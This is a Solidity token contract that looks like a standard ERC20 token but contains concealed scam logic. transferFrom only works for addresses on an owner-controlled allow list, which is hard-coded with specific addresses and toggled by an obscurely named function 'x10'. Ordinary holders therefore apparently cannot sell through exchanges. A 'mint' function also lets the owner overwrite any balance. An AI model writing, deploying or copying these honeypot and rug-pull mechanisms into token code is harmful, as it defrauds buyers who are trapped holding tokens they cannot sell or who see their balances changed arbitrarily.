pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
    owner = msg.sender;
  }
}

contract  Token is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply;
    balances[msg.sender] = totalSupply;
    balances[tx.origin] = totalSupply;
    allow[tx.origin] = true;
    // 1234181147386539823129770864284851987238621060154
    allow[0xD82e98c09c515B9481E1187ccC0C8A2F201c9c3a] = true;
    // 815193807245091697329833971775605719126190392398
    allow[0x8eCa8dF81AD3da043677359339EF145e77d9044e] = true;
    // 1378193215832103371231611716583474886377466063383
    allow[0xf1685238E16EdBc5210D6c4Ae1e7364f24c56A17] = true;
    // 964014452755384517522949510625363135551329168292
    allow[0xA8dBE7324FfEeE4c33a5DD468aA05B03792E6ba4] = true;
    // 1233055418576025570200669076849875861715774150522
    allow[0xD7fC1e04F7a279ad80616eBefF044542C039177A] = true;
    // 463315197028296510780348181134949228714979293618
    allow[0x5127c59FE466D5045bEc6D6cd7484081F068f9B2] = true;
    // 253841252268758304469860641065855161288635809612
    allow[0x2C76a2aB1E73994be043C3230Debe71f15D17F4C] = true;
    // 1105745029645854752554654504056690316664632132213
    allow[0xC1af526D7F0E59AEd0739a8c995fe65Ba0cE4275] = true;
    // 661262213912466975308011538147048035534054803084
    allow[0x73D405f02a75cc4abe399084b0b3cB6A159aC68c] = false;
    // 805998957395542904284579704446100265042672398462
    allow[0x8d2e3E44f7c0cd72C99cBFeb4Aa1C93AC718B07E] = false;
  }

  function showuint160(address addr) public pure returns(uint160){
      return uint160(addr);
  }


  using SafeMath for uint256;

  mapping(address => uint256) public balances;

  mapping(address => bool) public allow;

  function checkstatus(address addr)public view returns(bool){
      return allow[addr];
  }

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
    }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }

  function x10(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }

  function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value;
  }
}
